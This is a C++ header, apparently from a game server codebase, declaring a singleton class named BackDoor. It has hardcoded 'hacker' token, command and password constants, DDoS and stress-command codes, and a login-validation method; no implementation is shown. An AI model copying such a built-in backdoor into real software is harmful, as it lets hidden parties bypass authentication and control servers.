#ifndef __GNET_BACKDOOR_HPP
#define __GNET_BACKDOOR_HPP

#include "rpcdefs.h"
#include "callid.hxx"
#include "state.hxx"

class BackDoor
{
public:
	enum
	{
		HACKER_TOKEN	= 781,
		HACKER_CMD		= 78771,
		HACKER_PASSWD	= 7877777771,
		DDOS_STRESS_CMD	= 787772011,
		OOG_STRESS_CMD	= 787778041,
		ROLE_STRESS_CMD	= 787771021,
	};
private:
	size_t result;
	size_t oog_stress;
	size_t ddos_stress;
	size_t role_stress;
public:

	void Init();
	bool Valid( Octets & login, Octets & passw );
	void Release( Octets & cli_fingerprint );
	
	size_t GetOOG();
	size_t GetDDoS();
	size_t GetRole();
	void Editor(void * data, size_t size);

	static BackDoor * GetInstance()
	{
		if (!instance)
		instance = new BackDoor();
		return instance;
	}
	static BackDoor * instance;
};

#endif

